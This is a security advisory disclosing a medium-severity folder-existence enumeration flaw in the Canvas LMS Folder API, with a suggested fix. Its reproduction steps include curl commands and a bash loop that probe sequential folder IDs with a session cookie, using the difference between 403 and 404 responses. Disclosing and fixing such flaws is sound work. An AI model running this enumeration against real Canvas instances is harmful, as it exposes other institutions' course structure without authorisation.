# Canvas LMS - vrelease_2026-05-20.143 - Improper Access Control

| Field | Value |
| --- | --- |
| Vulnerability name | Improper Access Control |
| Vulnerability type | software |
| Product name | Canvas LMS |
| Product vendor | Instructure |
| Product version | release_2026-05-20.143 |
| Product link | https://www.instructure.com/ |
| Product environment | web |
| Severity | Medium |
| CVSS score | 4.3 |
| CVSS vector | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N |
| Affected assets | 4000 |
| Affected users | 30000000 |
| Date of reporting | 2026-04-20 |
| Vendor acknowledgement | No |
| Credit | 0xhamy |
| Date published | 2026-05-06T14:31:38.589467+00:00 |
| Last modified | 2026-05-06T14:49:06.120646+00:00 |

---

# Folder API Global Lookup Enables Cross-Context Folder Existence Enumeration

Thanks to [Basant Kumar](https://www.linkedin.com/in/basant1/) for assisting with identifying this vulnerability.

---

## Severity

**CVSS 3.1 Score:** 4.3 (Medium)

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`

| Metric              | Justification                                                                    |
| ------------------- | -------------------------------------------------------------------------------- |
| Attack Vector       | Network — exploitable via any HTTP client                                        |
| Attack Complexity   | Low — sequential ID enumeration, single request per folder                       |
| Privileges Required | Low — any authenticated Canvas user                                              |
| User Interaction    | None                                                                             |
| Scope               | Unchanged                                                                        |
| Confidentiality     | Low — only folder existence leaked, not names or contents                        |
| Integrity           | None — PUT/DELETE return 403                                                     |
| Availability        | None                                                                             |

---

## Vulnerability Type

- **Primary:** CWE-203 — Observable Discrepancy (403 vs 404 reveals folder existence)
- **Secondary:** CWE-284 — Improper Access Control (global lookup bypasses context scoping)

**OWASP Top 10:** A01:2021 — Broken Access Control **MITRE ATT&CK:** T1087 (Account Discovery)

---

## URL / Location

**Affected endpoints:**

| Endpoint | Method | Route | Lookup Type |
|----------|--------|-------|-------------|
| `show` | GET | `/api/v1/folders/:id` | Global (no context) |
| `update` | PUT | `/api/v1/folders/:id` | Global |
| `destroy` | DELETE | `/api/v1/folders/:id` | Global |
| `list files` | GET | `/api/v1/folders/:id/files` | Global |
| `list folders` | GET | `/api/v1/folders/:id/folders` | Global |

**Controller:** `app/controllers/folders_controller.rb`

**Root cause — global vs context-scoped lookup:**

```ruby
# API path — GLOBAL lookup (line 336-348)
def show
  if api_request?
    get_context  # get_context does NOT require context
    @folder = if @context
      @context.folders.active.find(params[:id])  # Scoped IF context provided
    else
      Folder.find(params[:id])  # GLOBAL if no context — THE BUG
    end
  else
    require_context
    @folder = @context.folders.find(params[:id])  # Web: ALWAYS scoped
  end
end

# update action — GLOBAL lookup (line 419-427)
def update
  if api_request?
    @folder = Folder.find(params[:id])  # GLOBAL — no context
    @context = @folder.context           # Context derived FROM folder
  else
    require_context
    @folder = @context.folders.find(params[:id])  # Web: scoped
  end
  if authorized_action(@folder, @current_user, :update)
```

The web path scopes all folder lookups to the current course context — a folder from another course always returns 404. The API path does a global `Folder.find(id)` first, then checks authorization. This creates an information disclosure oracle: 403 = folder exists, 404 = doesn't exist.

**Tested on:** Canvas LMS current master — Rails 8.0.5, Ruby 3.4.1, Puma 7.2.0 (`localhost:3000`)

---

## Description

The Canvas LMS Folder controller uses different database query patterns for API and web requests. When a folder is requested through the API without a course context (e.g., `GET /api/v1/folders/123`), the controller performs a global database lookup using `Folder.find(params[:id])`. After finding the folder, it checks authorization — returning 403 if the user lacks permission.

When the same folder is requested through the web UI, the controller scopes the lookup to the current course context using `@context.folders.find(params[:id])`. A folder from another course returns 404 regardless of whether it exists globally.

This difference creates an **existence oracle**: an authenticated user can iterate through sequential folder IDs and distinguish 403 (folder exists but no access) from 404 (folder doesn't exist) to enumerate all folders across the entire Canvas instance.

Canvas uses sequential integer IDs for folders. An attacker can enumerate all folder IDs to:

1. **Map all folders** across all courses in the instance
2. **Infer which courses exist** (folders are created per-course)
3. **Estimate instance size** (highest valid folder ID reveals total content)

**Escalation testing confirmed that authorization checks are properly enforced after the global lookup:**

- Listing files inside another course's folder (`/folders/:id/files`) → 403
- Listing subfolders (`/folders/:id/folders`) → 403
- Renaming a folder via PUT → 403
- Accessing admin user's personal files folder → 403

The vulnerability is limited to existence disclosure only. No folder names, contents, or metadata are leaked through the 403 response.

---

## Steps to Reproduce

### Prerequisites

- A Canvas LMS instance (tested on `localhost:3000`, current master branch)
- Any authenticated Canvas account (we used `student@test.local`)

### Step 1: Confirm Existence Oracle

```bash
# Folder ID 1 — EXISTS (belongs to another context)
curl -s -o /dev/null -w "%{http_code}" \
  http://localhost:3000/api/v1/folders/1 \
  -H "Cookie: _normandy_session=STUDENT_SESSION_COOKIE"
# Returns: 403 Forbidden

# Folder ID 99999 — DOES NOT EXIST
curl -s -o /dev/null -w "%{http_code}" \
  http://localhost:3000/api/v1/folders/99999 \
  -H "Cookie: _normandy_session=STUDENT_SESSION_COOKIE"
# Returns: 404 Not Found
```

The 403 vs 404 difference reveals folder existence.

### Step 2: Enumerate Folders at Scale

```bash
#!/bin/bash
for id in $(seq 1 50); do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://localhost:3000/api/v1/folders/$id" \
    -H "Cookie: _normandy_session=STUDENT_SESSION_COOKIE")
  case $status in
    200) echo "Folder $id: ACCESSIBLE (data returned)" ;;
    403) echo "Folder $id: EXISTS (forbidden)" ;;
    404) echo "Folder $id: does not exist" ;;
  esac
done
```

### Step 3: Verify Write Access Is Blocked

```bash
# Attempt to rename folder via PUT
curl -s -o /dev/null -w "%{http_code}" \
  -X PUT http://localhost:3000/api/v1/folders/1 \
  -H "Cookie: _normandy_session=STUDENT_SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"name":"pwned"}'
# Returns: 403 Forbidden — write correctly blocked
```

### Step 4: Verify File Listing Is Blocked

```bash
# Attempt to list files inside another course's folder
curl -s -o /dev/null -w "%{http_code}" \
  "http://localhost:3000/api/v1/folders/1/files" \
  -H "Cookie: _normandy_session=STUDENT_SESSION_COOKIE"
# Returns: 403 Forbidden — file listing correctly blocked
```

---

## Impact

- **Information Disclosure:** Enumerate all folder IDs across all courses in the Canvas instance
- **Reconnaissance:** Infer course existence and content structure (folders are created per-course)
- **Instance Profiling:** Highest valid folder ID reveals total folder count, estimating instance scale
- **Limited:** Folder names, file contents, and metadata are NOT leaked — only existence is disclosed

---

## Suggested Fix

Always scope folder lookups to the provided context, matching the web UI behavior:

```ruby
# Before (vulnerable):
def show
  if api_request?
    get_context
    @folder = if @context
      @context.folders.active.find(params[:id])
    else
      Folder.find(params[:id])  # Global lookup
    end
  end
end

# After (fixed):
def show
  require_context  # Always require context
  @folder = @context.folders.active.find(params[:id])  # Always scoped
end
```

Apply the same fix to `update` and `destroy` actions. This ensures that folder lookups outside the user's current context always return 404, eliminating the existence oracle.

---

## Evidence Summary

| # | Test | Result |
|---|------|--------|
| 1 | `GET /api/v1/folders/1` (exists) | 403 Forbidden — existence confirmed |
| 2 | `GET /api/v1/folders/99999` (doesn't exist) | 404 Not Found — baseline |
| 3 | `GET /api/v1/folders/1/files` (list files) | 403 — no file listing bypass |
| 4 | `GET /api/v1/folders/1/folders` (subfolders) | 403 — no subfolder listing bypass |
| 5 | `GET /api/v1/folders/2` (admin files) | 403 — no admin folder access |
| 6 | `PUT /api/v1/folders/1` (rename) | 403 — no write bypass |
| 7 | Web path comparison | `/courses/OTHER/folders/ID` returns 404 regardless — properly scoped |

---

## References

- [Canvas LMS Source — folders_controller.rb](https://github.com/instructure/canvas-lms/blob/master/app/controllers/folders_controller.rb)
- [CWE-203: Observable Discrepancy](https://cwe.mitre.org/data/definitions/203.html)
- [OWASP Testing Guide — Testing for Account Enumeration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account)
